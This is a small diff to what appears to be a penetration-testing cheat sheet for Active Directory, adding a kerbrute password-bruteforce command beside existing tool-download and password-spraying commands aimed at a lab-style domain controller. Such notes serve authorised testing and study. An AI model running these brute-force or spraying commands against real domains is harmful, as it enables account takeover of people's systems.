@@ -434,6 +434,10 @@ Get-ADDefaultDomainPasswordPolicy
 wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
 mv kerbrute_linux_amd64 kerbrute && chmod +x kerbrute && sudo mv kerbrute /usr/bin/kerbrute
 
+# Bruteforce
+kerbrute bruteuser -d VULN.local --dc 10.10.10.100 /usr/share/wordlists/rockyou.txt username -v
+
+
 # Spray
 kerbrute passwordspray -d VULN.local --dc 10.10.10.100 users.txt 'Password123'
 
